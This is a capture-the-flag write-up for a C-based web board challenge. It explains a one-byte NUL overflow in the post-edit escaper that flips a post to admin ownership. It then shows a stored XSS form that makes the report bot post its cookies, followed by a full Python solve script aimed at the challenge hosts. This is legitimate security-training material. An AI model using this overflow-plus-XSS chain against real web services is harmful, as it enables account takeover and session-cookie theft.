# web/CobWeb

## Overview

This challenge is a custom web board written in C.

The service flow is:

1. Connect to the launcher on `9883`.
2. The launcher prints a per-instance app port like `http://localhost:39404`.
3. Connect to that printed port on the same host and interact with the board.

The whole solve is a chain of:

- reverse the binary enough to understand auth, post rendering, and report behavior
- find a memory corruption bug in the edit path
- use it to turn our post into an admin-owned post
- put HTML/JS into that admin-owned post so the report bot executes it
- make the bot create a new post containing its cookies
- read the flag from `/board`

## Exploit Chain

1. Understand the launcher and the real app port.

   `unpack/ctf.xinetd` says the public service is on `9883`.

   `unpack/deploy/run.sh` shows:

   ```bash
   RAND=$(od -An -N2 -tu2 /dev/urandom | tr -d ' ')
   NUM=$((RAND % 50001 + 10000))
   timeout 60 su -c "/home/ctf/board_server $NUM" ctf
   ```

   So `9883` is only a launcher. The real HTTP service is started on a random local port.

   `strings` on `board_server` shows:

   - `board server started on port %d`
   - `http://localhost:%d`

   So the first thing the solver has to do is:

   - connect to `host:9883`
   - read until `http://localhost:<port>` appears
   - keep that launcher connection open while using `host:<port>`

2. Enumerate routes and core behavior from the binary.

   Running `strings -a unpack/deploy/board_server` reveals the important routes:

   - `/login`
   - `/register`
   - `/board`
   - `/post/new`
   - `/post/%d`
   - `/post/%d/edit`
   - `/post/%d/delete`
   - `/post/%d/report`

   The same `strings` output also reveals the SQL:

   - `INSERT INTO users (id, username, password) VALUES (0, 'admin', 'x$x')`
   - `INSERT INTO posts (user_id, title, content) VALUES (?, ?, ?);`
   - `UPDATE posts SET title = ?, content = ?, user_id = 0 WHERE id = ?;`
   - `UPDATE posts SET title = ?, content = ? WHERE id = ? AND user_id = ?;`

   This immediately tells us two important things:

   - there is a special admin user with `id = 0`
   - there is a special update path that can force `user_id = 0`

3. Read `bot.py` to understand what the report bot really does.

   `unpack/deploy/bot.py` is critical:

   ```python
   driver.get(f"http://127.0.0.1:{port}/")
   driver.add_cookie({"name": "session_id", "value": session_id})
   driver.add_cookie({"name": "flag", "value": flag})
   driver.get(url)
   ```

   So the bot:

   - opens the site
   - adds a `session_id` cookie
   - adds a `flag` cookie
   - visits `/post/<id>/`

   That means the final goal is not direct file read. The goal is to make the bot execute attacker-controlled HTML/JS while that `flag` cookie is present.

4. Notice that normal admin login is intentionally impossible.

   The admin password row is `x$x`.

   That is not a normal password hash you can log in with, so “just log in as admin” is not the path.

   We need to abuse the server into treating our post as admin-owned instead.

5. Find the rendering difference that makes admin-owned posts special.

   Reversing the post rendering path shows that post content is HTML-decoded only when:

   - `post.user_id == 0`

   That is the key rendering primitive:

   - normal user post: stored escaped HTML is shown as text
   - admin-owned post: stored escaped HTML is decoded back into raw HTML before being inserted into the response

   So if we can change our post’s `user_id` to `0`, our stored `<script>` will become executable HTML when the bot views the post.

6. Find the memory corruption in the edit path.

   The vulnerable path is the server-side post edit handler. The escaper reserves space incorrectly:

   - each character is parsed individually. When a char finishes parsing, the `out` var increase by the actual amount of space taken after expansion. Before parsing a new char, it checks if `out` is less or equal to `limit`, if not it will not parse because that would lead to memory corruption.
   - `limit` is set to `allocated memory - 6` to ensure we don't go over memory boundary. Let's assume the allocated memory is 10 bytes, then the limit will be 4 bytes. On the 5th char, because `out` is 4, it will parse. And even if it expands into 6 bytes it is still within the memory boundary.
   - but they forgot that it will add another `\0` at the end. so when 5th char is `"`, it will expanded to `&quot;` which is 6 bytes, taking all 10 bytes (still assume allocated memory is 10, actual value is much greater).
   - now the trailing `\0` goes into the 11th byte, one pass the memory boundary.

   This is a 1-byte NUL overflow.

7. Find where that 1-byte overflow lands.

   Reversing the edit handler shows the stack layout:

   - title escaped buffer at `[rsp+0x10]`, size `0x600`
   - content escaped buffer at `[rsp+0x610]`, size `0x6000`
   - saved current user id at `[rsp+0x6610]`

   The important arithmetic is:

   - `0x610 + 0x6000 = 0x6610`

   So the 1-byte overflow from the content buffer lands exactly on the low byte of the saved `user_id`.

8. Turn that one-byte overwrite into `user_id = 0`.

   If our current numeric user id is small, for example `1`, then zeroing the low byte changes:

   - `0x00000001 -> 0x00000000`

   Later in the same function, the server uses that now-corrupted saved `user_id`.

   That makes it take the special SQL branch:

   ```sql
   UPDATE posts SET title = ?, content = ?, user_id = 0 WHERE id = ?;
   ```

   So a normal user can edit their own post once, trigger the NUL overflow, and the server rewrites that post as admin-owned.

10. create the HTML payload.

   A reliable path is to make the bot create a new post and put `document.cookie` into the new post title so we can read the flag from `/board` directly.

   The final HTML payload is:

   ```html
   <form id=f method=POST action=/post/new>
     <input name=content value=1>
     <input name=title id=t>
     <script>onload=_=>{t.value=document.cookie;f.submit()}</script>
   ```

## Final Solve

```python
#!/usr/bin/env python3
import argparse
import random
import re
import socket
import string
import sys
import time
from typing import Dict, Optional, Tuple


FLAG_RE = re.compile(r"(?:flag|codegate2026)\{[^}]+\}")
PORT_RE = re.compile(rb"http://localhost:(\d+)")


def escape_html_len(text: str) -> int:
    total = 0
    for ch in text:
        if ch == "&":
            total += 5
        elif ch == "<" or ch == ">":
            total += 4
        elif ch == "'":
            total += 5
        elif ch == '"':
            total += 6
        else:
            total += 1
    return total


def build_overflow_content(post_id: int) -> str:
    payload_decoded = (
        "<form id=f method=POST action=/post/new><input name=content value=1>"
        "<input name=title id=t><script>onload=_=>{t.value=document.cookie;f.submit()}</script>"
    )
    payload_raw = payload_decoded

    for a_count in range(0, 16):
        for q_count in range(0, 5000):
            decoded = payload_decoded + ("A" * a_count) + ('"' * q_count) + '"'
            if escape_html_len(decoded) == 0x6000:
                return payload_raw + ("A" * a_count) + ('"' * q_count) + '"'
    raise RuntimeError("failed to build overflow content")


def recv_until_timeout(sock: socket.socket, timeout: float = 1.0) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def launch_instance(host: str, port: int = 9883) -> Tuple[socket.socket, int]:
    sock = socket.create_connection((host, port), timeout=5)
    sock.settimeout(5)
    data = b""
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
        match = PORT_RE.search(data)
        if match:
            return sock, int(match.group(1))
    raise RuntimeError(f"launcher did not return app port: {data!r}")


def random_cred(prefix: str) -> str:
    tail = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    return prefix + tail


def parse_http_response(response: bytes) -> Tuple[int, Dict[str, str], bytes]:
    head, _, body = response.partition(b"\r\n\r\n")
    status_line = head.split(b"\r\n", 1)[0]
    match = re.search(rb"HTTP/\d\.\d (\d+)", status_line)
    if not match:
        raise RuntimeError(f"invalid response: {status_line!r}")

    headers: Dict[str, str] = {}
    for line in head.split(b"\r\n")[1:]:
        if b":" not in line:
            continue
        key, value = line.split(b":", 1)
        headers[key.decode("latin-1").strip().lower()] = value.decode("latin-1").strip()
    return int(match.group(1)), headers, body


def http_request(
    host: str,
    port: int,
    method: str,
    path: str,
    body: bytes = b"",
    cookie: Optional[str] = None,
) -> Tuple[int, Dict[str, str], bytes]:
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}:{port}",
        "User-Agent: exploit",
        "Connection: close",
    ]
    if body:
        headers.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
        )
    if cookie:
        headers.append(f"Cookie: {cookie}")

    request = ("\r\n".join(headers) + "\r\n\r\n").encode() + body
    sock = socket.create_connection((host, port), timeout=5)
    sock.sendall(request)
    response = recv_until_timeout(sock, timeout=2.0)
    sock.close()
    return parse_http_response(response)


def extract_session_cookie(headers: Dict[str, str]) -> Optional[str]:
    set_cookie = headers.get("set-cookie")
    if not set_cookie:
        return None
    return set_cookie.split(";", 1)[0]


def register_and_login(host: str, port: int) -> Tuple[str, str, str]:
    username = random_cred("u")
    password = random_cred("p")

    status, _, _ = http_request(
        host, port, "POST", "/register", f"username={username}&password={password}".encode()
    )
    if status != 302:
        raise RuntimeError(f"register failed: {status}")

    status, headers, body = http_request(
        host, port, "POST", "/login", f"username={username}&password={password}".encode()
    )
    session_cookie = extract_session_cookie(headers)
    if status != 302 or not session_cookie:
        raise RuntimeError(f"login failed: {status} {body[:200]!r}")
    return username, password, session_cookie


def create_post(host: str, port: int, cookie: str, title: str, content: str) -> int:
    status, headers, body = http_request(
        host, port, "POST", "/post/new", f"title={title}&content={content}".encode(), cookie=cookie
    )
    if status != 302:
        raise RuntimeError(f"create post failed: {status} {body[:200]!r}")
    location = headers.get("location", "")
    if location.startswith("/post/"):
        match = re.search(r"/post/(\d+)", location)
        if match:
            return int(match.group(1))

    _, _, board = http_request(host, port, "GET", "/board", cookie=cookie)
    board_text = board.decode("utf-8", "replace")
    matches = []
    for post_id, post_title in re.findall(r'/post/(\d+)">([^<]+)</a>', board_text):
        if post_title == title:
            matches.append(int(post_id))
    if matches:
        return max(matches)
    raise RuntimeError(f"missing post id in board after create: {location!r}")


def verify_admin_flip(host: str, port: int, cookie: str, post_id: int) -> bool:
    status, _, _ = http_request(host, port, "GET", f"/post/{post_id}/edit", cookie=cookie)
    return status == 403


def report_post(host: str, port: int, cookie: str, post_id: int) -> Tuple[int, Dict[str, str], bytes]:
    return http_request(host, port, "POST", f"/post/{post_id}/report", cookie=cookie)


def poll_flag(host: str, port: int, cookie: str, post_id: int, seconds: float) -> Optional[str]:
    deadline = time.time() + seconds
    while time.time() < deadline:
        try:
            _, _, body = http_request(host, port, "GET", "/board", cookie=cookie)
        except OSError:
            time.sleep(0.5)
            continue
        match = FLAG_RE.search(body.decode("utf-8", "replace"))
        if match:
            return match.group(0)
        try:
            _, _, body = http_request(host, port, "GET", f"/post/{post_id}", cookie=cookie)
        except OSError:
            time.sleep(0.5)
            continue
        match = FLAG_RE.search(body.decode("utf-8", "replace"))
        if match:
            return match.group(0)
        time.sleep(0.5)
    return None


def board_titles(host: str, port: int, cookie: str) -> list[str]:
    _, _, body = http_request(host, port, "GET", "/board", cookie=cookie)
    text = body.decode("utf-8", "replace")
    return [title for _, title in re.findall(r'/post/(\d+)">([^<]+)</a>', text)]


def run_remote(host: str, launcher_port: int, poll_seconds: float, verbose: bool) -> Optional[str]:
    launcher_sock, app_port = launch_instance(host, launcher_port)
    if verbose:
        print(f"[+] launcher {host}:{launcher_port} -> app port {app_port}", file=sys.stderr)

    try:
        username, _, session_cookie = register_and_login(host, app_port)
        if verbose:
            print(f"[+] logged in as {username}", file=sys.stderr)

        warm_title = random_cred("w")
        warm_id = create_post(host, app_port, session_cookie, warm_title, "warm")
        title = random_cred("t")
        post_id = create_post(host, app_port, session_cookie, title, "seed")
        if verbose:
            print(f"[+] warm post {warm_id}, target post {post_id}", file=sys.stderr)

        overflow_content = build_overflow_content(post_id)
        body = f"title=x&content={overflow_content}".encode()
        status, headers, _ = http_request(
            host, app_port, "POST", f"/post/{post_id}/edit", body, cookie=session_cookie
        )
        if verbose:
            print(f"[+] overflow edit status {status}", file=sys.stderr)
            print(f"[+] overflow location {headers.get('location')}", file=sys.stderr)
        if status not in (200, 302):
            raise RuntimeError(f"overflow edit failed with status {status}")

        if not verify_admin_flip(host, app_port, session_cookie, post_id):
            raise RuntimeError("ownership flip did not happen")
        if verbose:
            print("[+] post ownership flipped to admin", file=sys.stderr)

        report_status = 500
        report_body = b""
        for attempt in range(3):
            report_status, _, report_body = report_post(host, app_port, session_cookie, post_id)
            if verbose:
                print(f"[+] report attempt {attempt + 1} status {report_status}", file=sys.stderr)
            if report_status < 400:
                break
            time.sleep(0.5)
        if report_status >= 400:
            raise RuntimeError(f"report failed: {report_status} {report_body[:200]!r}")

        flag = poll_flag(host, app_port, session_cookie, post_id, poll_seconds)
        if verbose and not flag:
            try:
                titles = board_titles(host, app_port, session_cookie)
                print(f"[+] board titles {titles[:6]}", file=sys.stderr)
            except Exception as exc:
                print(f"[+] board debug failed: {exc}", file=sys.stderr)
        return flag
    finally:
        try:
            launcher_sock.close()
        except Exception:
            pass


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", action="append", dest="hosts")
    parser.add_argument("--launcher-port", type=int, default=9883)
    parser.add_argument("--poll-seconds", type=float, default=20.0)
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    hosts = args.hosts or ["43.203.149.201", "15.164.173.24"]
    for host in hosts:
        try:
            flag = run_remote(host, args.launcher_port, args.poll_seconds, args.verbose)
        except Exception as exc:
            print(f"[-] {host}: {exc}", file=sys.stderr)
            continue
        if flag:
            print(flag)
            return 0
        print(f"[-] {host}: no flag yet", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Run it:

```bash
python3 solve.py --host 43.203.149.201 --poll-seconds 20 --verbose
```